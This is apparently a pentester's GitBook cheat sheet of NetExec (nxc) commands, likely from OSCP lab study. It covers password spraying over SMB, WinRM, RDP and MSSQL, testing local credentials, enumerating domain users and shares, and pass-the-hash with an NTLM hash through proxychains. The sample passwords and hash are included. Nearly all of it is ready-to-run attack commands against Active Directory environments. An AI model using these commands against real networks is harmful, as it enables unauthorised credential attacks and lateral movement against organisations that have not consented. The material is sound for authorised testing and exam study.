---
description: Various Net Exec commands for every scenario
---

# NXC - Net Exec

### Password Spraying

{% tabs %}
{% tab title="SMB" %}
```shellscript
# Spray one password to all domain users
nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
```
{% endtab %}

{% tab title="winrm" %}
```bash
# Spray one password for all identified domain-users in a machine.
# This can work ALSO for local users so include them as well
nxc winrm 10.10.206.148 -u all-users.txt -p 'Dolphin1'
```
{% endtab %}

{% tab title="rdp" %}
```bash
nxc rdp domain-hosts.txt -u mike -p 'Darkness1099!' -d corp.com
```
{% endtab %}

{% tab title="mssql" %}
```bash
# For Domain User password spray we use -d flag (forces Kerberos/NTLM auth)
nxc mssql 10.10.182.142 -u domain-users.txt -p 'Diamond1' -d oscp.exam
```
{% endtab %}
{% endtabs %}

### Testing Local User Credentials&#x20;

{% tabs %}
{% tab title="SMB" %}
```shellscript
nxc mssql 192.168.201.96 -u smbuser -p 'New2Era4.!' --local-auth
```
{% endtab %}

{% tab title="MSSQL" %}
```shellscript
nxc mssql 192.168.201.96 -u sa -p 'password' --local-auth
```
{% endtab %}
{% endtabs %}

### Find All Domain Users

```shellscript
nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --users | awk '$6 ~ /^[0-9]{4}-/ {print $5}' > domain-users.txt
```

### Enumerate Share Access&#x20;

```shellscript
nxc smb domain-ips.txt -u stephanie -p 'LegmanTeamBenzoin!!' --shares
```

### Enumerate Share Access using PtH

```shellscript
proxychains4 nxc smb domain-hosts.txt -H fdf36048c1cf88f5630381c5e38feb8e -u wario -d medtech.com --shares
```

#### List shares using a local user on a specific machine

```shellscript
nxc smb 192.168.201.96 -u apache -p 'New2Era4.!' --local-auth --shares
```

